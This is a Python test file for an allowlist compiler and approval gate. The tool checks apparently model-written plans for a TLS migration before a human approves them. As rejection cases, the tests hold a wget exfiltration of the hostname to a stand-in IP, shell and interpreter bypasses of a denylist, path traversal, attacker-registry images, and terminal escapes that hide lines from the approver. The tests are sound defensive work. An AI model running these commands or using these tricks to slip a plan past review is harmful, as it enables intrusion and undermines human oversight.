"""Plan schema and allowlist compiler: table tests. Approval of a plan (plan.approve)."""
import copy
import hashlib
import json
import os
import pathlib
import select
import subprocess
import sys
import time
import unittest

from pqproof.plan import PLAN_SCHEMA, NotApproved, PlanError, approve, ask_tty, compile_allowlist, plan_json, plan_sha256
from pqproof.plan import PROBE_ADDRS

ROOT = pathlib.Path(__file__).resolve().parent.parent

DIGEST = "a" * 64
PLAN = {
    "version": 1,
    "summary": "Move orders-edge TLS key exchange to X25519MLKEM768 with X25519 fallback.",
    "edits": [
        {"path": "nginx/nginx.conf", "why": "ssl_ecdh_curve is pinned to prime256v1"},
        {"path": "api/server.go", "why": "CurvePreferences is pinned to P-256"},
        {"path": "go.mod", "why": "go directive predates ML-KEM in crypto/tls"},
        {"path": "Dockerfile", "why": "base image ships OpenSSL 3.0"},
    ],
    "commands": [["make", "test"], ["go", "build", "./..."], ["nginx", "-t", "-c", "/work/nginx/nginx.conf"]],
    "images": [f"golang:1.25-bookworm@sha256:{DIGEST}", f"nginx@sha256:{DIGEST}"],
    "targets": [{"addr": "127.0.0.1:8443", "server": "nginx"}],
}


def plan_with(**changes):
    p = copy.deepcopy(PLAN)
    for k, v in changes.items():
        if v is None:
            p.pop(k)
        else:
            p[k] = v
    return p


class Compile(unittest.TestCase):
    def setUp(self):
        self.allow = compile_allowlist(PLAN)

    def test_commands_match_exact_argv(self):
        cases = [
            (["make", "test"], True),
            (["go", "build", "./..."], True),
            (["make", "test", "EXTRA=1"], False),   # same program, different arguments
            (["make"], False),
            (["go", "run", "./cmd/exfil"], False),
            (["rm", "-rf", "/"], False),
        ]
        for argv, ok in cases:
            with self.subTest(argv=argv):
                self.assertEqual(self.allow.allows_command(argv), ok)

    def test_paths(self):
        cases = [
            ("nginx/nginx.conf", True),
            ("./nginx/./nginx.conf", True),          # normalised
            ("api/server.go", True),
            ("api/handlers.go", False),               # not in the plan
            ("README.md", False),
            ("../orders-edge/go.mod", False),
            ("nginx/../../etc/passwd", False),
            ("/etc/passwd", False),
            (".git/hooks/pre-commit", False),
            ("nginx\\nginx.conf", False),
        ]
        for path, ok in cases:
            with self.subTest(path=path):
                self.assertEqual(self.allow.allows_path(path), ok)

    def test_images(self):
        cases = [
            (f"golang:1.25-bookworm@sha256:{DIGEST}", True),
            (f"nginx@sha256:{DIGEST}", True),
            ("golang:1.25-bookworm", False),          # the tag alone is not what was approved
            (f"golang:1.25-bookworm@sha256:{'b' * 64}", False),
            (f"evil.example.com/golang:1.25-bookworm@sha256:{DIGEST}", False),
        ]
        for ref, ok in cases:
            with self.subTest(ref=ref):
                self.assertEqual(self.allow.allows_image(ref), ok)

    def test_official_image_spellings(self):
        for ref in (f"docker.io/library/nginx@sha256:{DIGEST}", f"library/nginx:1.29@sha256:{DIGEST}"):
            with self.subTest(ref=ref):
                self.assertTrue(compile_allowlist(plan_with(images=[ref])).allows_image(ref))

    def test_no_egress_field_anywhere(self):
        # targets are loopback addresses inside the prove microVM, not egress destinations
        self.assertEqual(set(self.allow.to_json()), {"commands", "paths", "images", "targets"})
        self.assertNotIn("egress", str(PLAN_SCHEMA).lower())
        self.assertFalse(PLAN_SCHEMA["additionalProperties"])

    def test_schema_and_compiler_agree_on_fields(self):
        self.assertEqual(set(PLAN_SCHEMA["properties"]), set(PLAN_SCHEMA["required"]))
        self.assertEqual(set(PLAN_SCHEMA["required"]), set(PLAN))
        self.assertEqual(PLAN_SCHEMA["properties"]["targets"]["minItems"], 1)

    def test_targets_are_loopback_only(self):
        def t(*addrs):
            return [{"addr": a, "server": "nginx"} for a in addrs]
        ok = compile_allowlist(plan_with(targets=t("127.0.0.1:8443", "127.0.0.1:9443", "127.0.0.1:1", "127.0.0.1:65535")))
        self.assertEqual(ok.addrs, frozenset({"127.0.0.1:8443", "127.0.0.1:9443", "127.0.0.1:1", "127.0.0.1:65535"}))
        for bad in (t("203.0.113.7:80"), t("0.0.0.0:8443"), t("localhost:8443"), t("127.0.0.1:8443/x"), [8443],
                    "127.0.0.1:1", t("127.0.0.1:0"), t("127.0.0.1:99999"), t("127.0.0.1:65536"), t("127.0.0.1:08443"),
                    ["127.0.0.1:8443"]):  # a bare address does not say which server must answer
            with self.subTest(bad=bad), self.assertRaises(PlanError):
                compile_allowlist(plan_with(targets=bad))

    def test_each_target_names_the_server_that_must_own_its_port(self):
        # review day 2 (S1): the API took nginx's port and answered in its place
        cmds = PLAN["commands"] + [["go", "build", "-o=out/api", "./cmd/api"], ["api"]]
        allow = compile_allowlist(plan_with(commands=cmds, targets=[{"addr": "127.0.0.1:8443", "server": "nginx"},
                                                                    {"addr": "127.0.0.1:9443", "server": "api"}]))
        self.assertEqual(allow.targets, frozenset({("127.0.0.1:8443", "nginx"), ("127.0.0.1:9443", "api")}))
        self.assertEqual(allow.to_json()["targets"], [{"addr": "127.0.0.1:8443", "server": "nginx"},
                                                      {"addr": "127.0.0.1:9443", "server": "api"}])
        for bad in ([{"addr": "127.0.0.1:9443", "server": "api"}],             # api is not built by this plan
                    [{"addr": "127.0.0.1:8443", "server": "tls_probe"}],
                    [{"addr": "127.0.0.1:8443"}],
                    [{"addr": "127.0.0.1:8443", "server": "nginx", "pid": 1}],
                    [{"addr": "127.0.0.1:8443", "server": "nginx"}, {"addr": "127.0.0.1:8443", "server": "nginx"}]):
            with self.subTest(bad=bad), self.assertRaises(PlanError):
                compile_allowlist(plan_with(targets=bad))

    def test_a_plan_must_name_what_to_probe(self):
        # review day 2: without targets the proof probed nothing and the e2e still passed
        for targets in (None, []):
            with self.subTest(targets=targets), self.assertRaises(PlanError):
                compile_allowlist(plan_with(targets=targets))

    def test_the_probe_s_own_server_is_not_a_target(self):
        # review day 2: 127.0.0.1:4433 is the probe's reference server, which always speaks hybrid
        for addr in PROBE_ADDRS:
            with self.subTest(addr=addr), self.assertRaises(PlanError):
                compile_allowlist(plan_with(targets=[{"addr": "127.0.0.1:8443", "server": "nginx"},
                                                     {"addr": addr, "server": "nginx"}]))

    def test_a_plan_may_run_what_it_builds(self):
        cmds = [["go", "build", "-trimpath", "-o=out/api", "./cmd/api"], ["api"], ["api", "-addr=127.0.0.1:9443"]]
        allow = compile_allowlist(plan_with(commands=cmds))
        self.assertTrue(allow.allows_command(["api"]))
        for bad in ([["api"]],                                                   # not built by this plan
                    [["go", "build", "-o=out/api", "."], ["api", "--exec", "sh"]],  # not a -flag=value argument
                    [["go", "build", "-o=out/api", "."], ["api", "-x=a b"]],
                    [["go", "build", "-o=bin/make", "."], ["make", "anything"]],  # shadows an allowed program
                    [["go", "build", "-o=bin/sh", "."], ["sh"]],
                    # reads as the tool the prove step itself runs as root (VX1 review)
                    [["go", "build", "-o=out/install", "."], ["install"]]):
            with self.subTest(bad=bad), self.assertRaises(PlanError):
                compile_allowlist(plan_with(commands=bad))


class ApprovalText(unittest.TestCase):
    """Review day 2: the approval screen prints the model's summary and each edit's why as they
    are, so terminal escapes could move the cursor and hide the image and command lines."""

    def test_free_text_is_printable_and_bounded(self):
        for bad in ("ok\x1b[1A\x1b[2K\r  image nginx:1.30-trixie -> (hidden)", "a\nb", "a\rb", "x\x00", "x\x7f", "x\x9b2K",
                    "abc\u202edcba", "zero\u200bwidth", "line\u2028sep", "x" * 2001, 7, None):
            with self.subTest(bad=repr(bad)[:40]):
                with self.assertRaises(PlanError):
                    compile_allowlist(plan_with(summary=bad))
                if not (isinstance(bad, str) and len(bad) > 500):
                    with self.assertRaises(PlanError):
                        compile_allowlist(plan_with(edits=[{"path": "nginx/nginx.conf", "why": bad}]))
        with self.assertRaises(PlanError):
            compile_allowlist(plan_with(edits=[{"path": "nginx/nginx.conf", "why": "w" * 501}]))
        ok = "Move to X25519MLKEM768 (hybrid ML-KEM) \u2014 keep P-256; café, Zürich, naïve."  # an em dash is printable
        compile_allowlist(plan_with(summary=ok, edits=[{"path": "nginx/nginx.conf", "why": ok}]))


class Reject(unittest.TestCase):
    CASES = [
        ("egress hosts field", plan_with(egress_hosts=["proxy.golang.org"]), "unknown plan fields"),
        ("network field", plan_with(network={"allow": ["0.0.0.0/0"]}), "unknown plan fields"),
        ("missing commands", plan_with(commands=None), "missing plan fields"),
        ("version 2", plan_with(version=2), "unsupported plan version"),
        ("version true", plan_with(version=True), "unsupported plan version"),
        ("commands not a list", plan_with(commands="make test"), "commands must be a list"),
        ("shell", plan_with(commands=[["bash", "-c", "make test"]]), "not allowed"),
        ("sh", plan_with(commands=[["sh", "build.sh"]]), "not allowed"),
        ("env wrapper", plan_with(commands=[["env", "curl", "x"]]), "not allowed"),
        ("curl", plan_with(commands=[["curl", "http://203.0.113.7"]]), "not allowed"),
        ("git", plan_with(commands=[["git", "push"]]), "not allowed"),
        ("absolute program", plan_with(commands=[["/usr/bin/go", "build"]]), "not a path"),
        ("relative script", plan_with(commands=[["./run.sh"]]), "not a path"),
        ("python -c", plan_with(commands=[["python3", "-c", "import os"]]), "not allowed"),
        ("node -e", plan_with(commands=[["node", "-e", "1"]]), "not allowed"),
        ("go without a subcommand", plan_with(commands=[["go"]]), "subcommand"),
        ("go run", plan_with(commands=[["go", "run", "./cmd/exfil"]]), "subcommand"),
        ("go generate", plan_with(commands=[["go", "generate", "./..."]]), "subcommand"),
        ("go -toolexec", plan_with(commands=[["go", "build", "-toolexec=sh -c id", "./..."]]), "argument"),
        ("go test -exec", plan_with(commands=[["go", "test", "-exec", "sh", "./..."]]), "argument"),
        ("go -ldflags", plan_with(commands=[["go", "build", "-ldflags=-X main.v=1", "./..."]]), "argument"),
        ("make --eval", plan_with(commands=[["make", "--eval=x:;@id", "x"]]), "argument"),
        ("make variable override", plan_with(commands=[["make", "SHELL=/bin/sh", "test"]]), "argument"),
        ("make -f", plan_with(commands=[["make", "-f", "Makefile.planted", "all"]]), "argument"),
        ("make -C", plan_with(commands=[["make", "-C", "/", "test"]]), "argument"),
        ("nginx -g", plan_with(commands=[["nginx", "-g", "load_module x.so;", "-t"]]), "argument"),
        ("nginx relative config", plan_with(commands=[["nginx", "-t", "-c", "nginx.conf"]]), "argument"),
        ("empty argv", plan_with(commands=[[]]), "non-empty list"),
        ("non-string arg", plan_with(commands=[["make", 1]]), "non-empty list"),
        ("absolute edit", plan_with(edits=[{"path": "/etc/hosts", "why": "x"}]), "absolute path"),
        ("traversal edit", plan_with(edits=[{"path": "a/../../b", "why": "x"}]), "leaves the repo"),
        ("dot edit", plan_with(edits=[{"path": ".", "why": "x"}]), "leaves the repo"),
        (".git edit", plan_with(edits=[{"path": ".git/config", "why": "x"}]), "inside .git"),
        # APFS and other case-insensitive file systems treat these as .git.
        (".GIT edit", plan_with(edits=[{"path": ".GIT/hooks/pre-commit", "why": "x"}]), "inside .git"),
        (".Git edit", plan_with(edits=[{"path": ".Git/config", "why": "x"}]), "inside .git"),
        ("nested .git", plan_with(edits=[{"path": "vendor/x/.git/config", "why": "x"}]), "inside .git"),
        ("zero-width joiner", plan_with(edits=[{"path": ".git\u200c/config", "why": "x"}]), "characters"),
        ("newline", plan_with(edits=[{"path": "go.mod\nPASS all checks", "why": "x"}]), "characters"),
        ("carriage return", plan_with(edits=[{"path": "go.mod\rX", "why": "x"}]), "characters"),
        ("escape sequence", plan_with(edits=[{"path": "nginx/\x1b[2Jnginx.conf", "why": "x"}]), "characters"),
        ("backslash", plan_with(edits=[{"path": "nginx\\nginx.conf", "why": "x"}]), "characters"),
        ("NUL", plan_with(edits=[{"path": "go.mod\0", "why": "x"}]), "characters"),
        ("empty path", plan_with(edits=[{"path": "", "why": "x"}]), "bad path"),
        ("edit without why", plan_with(edits=[{"path": "go.mod"}]), "exactly 'path' and 'why'"),
        ("edit extra key", plan_with(edits=[{"path": "go.mod", "why": "x", "mode": "0777"}]), "exactly"),
        ("untagged image", plan_with(images=["golang"]), "pinned by digest"),
        ("latest image", plan_with(images=["nginx:latest"]), "pinned by digest"),
        ("tag only", plan_with(images=["golang:1.25-bookworm"]), "pinned by digest"),
        ("floating tag", plan_with(images=["alpine:edge"]), "pinned by digest"),
        ("short digest", plan_with(images=["nginx@sha256:abc"]), "pinned by digest"),
        ("uppercase image", plan_with(images=[f"Golang:1.25@sha256:{DIGEST}"]), "pinned by digest"),
        ("image with space", plan_with(images=[f"golang:1.25 --privileged@sha256:{DIGEST}"]), "pinned by digest"),
        ("trailing newline", plan_with(images=[f"nginx@sha256:{DIGEST}\n"]), "pinned by digest"),
        ("option-like image", plan_with(images=[f"--conf=/tmp/x@sha256:{DIGEST}"]), "pinned by digest"),
        ("image not a string", plan_with(images=[{"ref": "golang:1.25"}]), "pinned by digest"),
        ("other registry", plan_with(images=[f"evil.example.com/golang:1.25@sha256:{DIGEST}"]), "Docker Hub"),
        ("ghcr", plan_with(images=[f"ghcr.io/attacker/golang:1.25@sha256:{DIGEST}"]), "Docker Hub"),
        ("look-alike", plan_with(images=[f"docker.io.evil.example/library/golang@sha256:{DIGEST}"]), "Docker Hub"),
        ("non-library repo", plan_with(images=[f"attacker/golang@sha256:{DIGEST}"]), "Docker Hub"),
    ]

    def test_rejections(self):
        for name, plan, message in self.CASES:
            with self.subTest(name):
                with self.assertRaises(PlanError) as cm:
                    compile_allowlist(plan)
                self.assertIn(message, str(cm.exception))

    def test_every_problem_is_named_at_once(self):
        # VX1 review: compile_allowlist raised on the first bad command, path or image, so a model told
        # why its plan was refused fixed one thing per reply
        plan = plan_with(commands=PLAN["commands"] + [["sh", "-c", "id"], ["curl", "x"]],
                         edits=PLAN["edits"] + [{"path": "../x", "why": "w"}, {"path": ".git/config", "why": "w"}],
                         images=PLAN["images"] + ["nginx:latest", f"ghcr.io/a/b@sha256:{DIGEST}"],
                         targets=PLAN["targets"] + [{"addr": "10.0.0.1:443", "server": "nginx"}],
                         summary="a\x1bb")
        with self.assertRaises(PlanError) as cm:
            compile_allowlist(plan)
        want = ["summary has characters", "'../x'", "'.git/config'", "'sh'", "'curl'", "'nginx:latest'", "ghcr.io",
                "'10.0.0.1:443'"]
        self.assertEqual([w for w in want if w not in str(cm.exception)], [], str(cm.exception).splitlines())

    def test_bypasses_found_in_review(self):
        # Each of these ran a shell, inline code or a network client while a denylist was in place.
        bypasses = [
            ["find", ".", "-exec", "sh", "-c", "wget -qO- http://203.0.113.7/$(cat /etc/hostname)", ";"],
            ["python3", "-Ic", "import socket"], ["python3", "-cimport socket"], ["python3.12", "-c", "1"],
            ["python3", "-m", "http.server", "8000"], ["node", "--eval", "1"], ["node", "-p", "1"],
            ["perl", "-E", "say 1"], ["perl", "-le", "print 1"], ["busybox", "sh", "-c", "id"],
            ["busybox", "wget", "http://203.0.113.7/"], ["timeout", "100", "sh", "-c", "id"],
            ["nice", "bash", "-c", "id"], ["setsid", "sh", "-c", "id"], ["awk", 'BEGIN{system("id")}'],
            ["openssl", "s_client", "-connect", "203.0.113.7:443"], ["apk", "add", "curl"],
            ["pip", "install", "requests"], ["php", "-r", "echo 1;"], ["npx", "x"], ["xargs", "sh"],
        ]
        for argv in bypasses:
            with self.subTest(argv=argv), self.assertRaises(PlanError):
                compile_allowlist(plan_with(commands=[argv]))

    def test_not_an_object(self):
        with self.assertRaises(PlanError):
            compile_allowlist(["make", "test"])


class Approve(unittest.TestCase):
    """README said "a human approves", but the recorded runs passed --approve, and with the key on
    standard input (--key-file /dev/stdin) input() saw /dev/null and the prompt always said no."""

    def never_asked(self, question):
        raise AssertionError("asked although nothing was to be asked")

    def test_the_plan_is_named_by_the_sha256_of_its_plan_json(self):
        self.assertEqual(plan_json(PLAN), (json.dumps(PLAN, indent=2, sort_keys=True, ensure_ascii=False) + "\n").encode())
        self.assertEqual(plan_sha256(PLAN), hashlib.sha256(plan_json(PLAN)).hexdigest())
        self.assertNotEqual(plan_sha256(plan_with(summary="another summary")), plan_sha256(PLAN))

    def test_three_modes(self):
        digest = plan_sha256(PLAN)
        flag = approve(PLAN, flag=True, ask=self.never_asked, now=lambda: 5.0)
        self.assertEqual(flag, {"mode": "flag", "approver": None, "at": 5.0, "plan_sha256": digest})
        by_hash = approve(PLAN, plan_hash=" " + digest.upper() + "\n", approver="alice", ask=self.never_asked)
        self.assertEqual((by_hash["mode"], by_hash["approver"], by_hash["plan_sha256"]), ("plan-hash", "alice", digest))
        prompt = approve(PLAN, approver="J. Doe", ask=lambda q: "Y\n")
        self.assertEqual((prompt["mode"], prompt["approver"]), ("prompt", "J. Doe"))
        self.assertIsNone(approve(PLAN, ask=lambda q: "y\n")["approver"])  # no name given: null

    def test_no_is_the_default_answer(self):
        for answer in ("", "\n", "n\n", "yes\n", "no"):
            with self.subTest(answer=answer):
                with self.assertRaises(NotApproved):
                    approve(PLAN, ask=lambda q: answer)

    def test_a_plan_hash_approves_that_plan_only(self):
        read = plan_sha256(PLAN)
        with self.assertRaises(NotApproved) as cm:
            approve(plan_with(commands=PLAN["commands"] + [["go", "vet", "./..."]]), plan_hash=read, ask=self.never_asked)
        self.assertIn(read, str(cm.exception))
        self.assertIn("not this plan's SHA-256", str(cm.exception))

    def test_an_unattended_approval_names_no_one(self):
        for kwargs in ({"approver": "alice"}, {"plan_hash": plan_sha256(PLAN)}):
            with self.subTest(**kwargs):
                with self.assertRaises(NotApproved):
                    approve(PLAN, flag=True, ask=self.never_asked, **kwargs)
        # \u3164 (Hangul filler) is \w to Python, yet shows as nothing; a JSON Schema validator's \w is ASCII
        for bad in ("a\nb", "eve\n", "x" * 65, "", " lead", "<b>", "a\x1b[2Kb", "\u3164", "Jos\u00e9"):
            with self.subTest(approver=bad):
                with self.assertRaises(NotApproved):
                    approve(PLAN, approver=bad, ask=lambda q: "y\n")

    def test_without_a_terminal_the_answer_is_no_with_a_reason(self):
        with self.assertRaises(NotApproved) as cm:
            ask_tty("Approve plan X? [y/N] ", tty=os.path.join(os.sep, "nonexistent", "tty"))
        self.assertIn("no terminal to ask on", str(cm.exception))
        self.assertIn("--approve-plan", str(cm.exception))
        # a process with no controlling terminal: /dev/tty itself cannot be opened
        code = "from pqproof.plan import ask_tty, NotApproved\ntry:\n    ask_tty('q? ')\nexcept NotApproved as e:\n    print(e)"
        r = subprocess.run([sys.executable, "-c", code], stdin=subprocess.DEVNULL, capture_output=True, text=True,
                           start_new_session=True, env=dict(os.environ, PYTHONPATH=str(ROOT)), timeout=60)
        self.assertIn("no terminal to ask on (/dev/tty", r.stdout, r.stderr)

    def converse(self, code, *, typed_ahead=b"", answer=b"y\n", stdin=""):
        """Run code with a pseudo-terminal's path as sys.argv[1], answer once its question is on the
        terminal (or first type typed_ahead, before the program even starts) and return (what the
        terminal showed, the program's stdout)."""
        master, slave = os.openpty()
        self.addCleanup(os.close, master)
        self.addCleanup(os.close, slave)
        if typed_ahead:
            os.write(master, typed_ahead)
        p = subprocess.Popen([sys.executable, "-c", code, os.ttyname(slave)], stdin=subprocess.PIPE,
                             stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True,
                             env=dict(os.environ, PYTHONPATH=str(ROOT)))
        self.addCleanup(lambda: p.poll() is None and p.kill())
        p.stdin.write(stdin)
        p.stdin.close()
        shown, deadline = b"", time.monotonic() + 60
        while b"[y/N] " not in shown:
            ready, _, _ = select.select([master], [], [], max(0.0, deadline - time.monotonic()))
            if not ready:
                self.fail(f"no question on the terminal: {shown!r}")
            shown += os.read(master, 4096)
        os.write(master, answer)
        out, err = p.communicate(timeout=60)
        self.assertEqual(p.returncode, 0, err)
        return shown, out

    def test_the_answer_comes_from_the_terminal_when_the_key_came_on_standard_input(self):
        # the VX1 command: --key-file /dev/stdin < inference.env. key_from_file leaves fd 0 on /dev/null;
        # the question goes to the terminal (here a pseudo-terminal), with the plan's SHA-256, and so does
        # the answer, typed once the question is there
        code = ("import sys\nfrom pqproof.inference import key_from_file\nfrom pqproof.plan import approve, ask_tty\n"
                "key_from_file('/dev/stdin')\nprint(sys.stdin.read() == '')\n"
                "print(approve({'v': 1}, ask=lambda q: ask_tty(q, sys.argv[1]))['mode'])")
        shown, out = self.converse(code, stdin="VULTR_INFERENCE_API_KEY=k\n")
        self.assertEqual(out.split(), ["True", "prompt"])
        self.assertIn(f"Approve plan {plan_sha256({'v': 1})}? [y/N] ".encode(), shown)

    def test_a_key_pressed_before_the_question_is_not_an_answer(self):
        # a y pressed while the model was still writing the plan, or the next line of a paste, sits in
        # the terminal's input queue; it is discarded, and the empty answer given to the question is no
        code = ("import sys\nfrom pqproof.plan import NotApproved, approve, ask_tty\n"
                "try:\n    print(approve({'v': 1}, ask=lambda q: ask_tty(q, sys.argv[1]))['mode'])\n"
                "except NotApproved as e:\n    print('not approved:', e)")
        _, out = self.converse(code, typed_ahead=b"y\n", answer=b"\n")
        self.assertEqual(out, "not approved: the answer was not y\n")
        _, out = self.converse(code, typed_ahead=b"n\n", answer=b"y\n")  # and an answer typed after it counts
        self.assertEqual(out, "prompt\n")

    def test_the_plan_goes_to_the_terminal_before_the_question(self):
        # e2e/orders_edge.py passes the plan as preface when standard output is not the terminal (> run.log)
        code = ("import sys\nfrom pqproof.plan import ask_tty\n"
                "print(repr(ask_tty('Approve plan X? [y/N] ', sys.argv[1], preface='Plan: one line\\n  plan sha256 X\\n')))")
        shown, out = self.converse(code)
        self.assertRegex(shown, rb"Plan: one line\r?\n  plan sha256 X\r?\nApprove plan X\? \[y/N\] $")
        self.assertEqual(out.strip(), repr("y\n"))

if __name__ == "__main__":
    unittest.main()
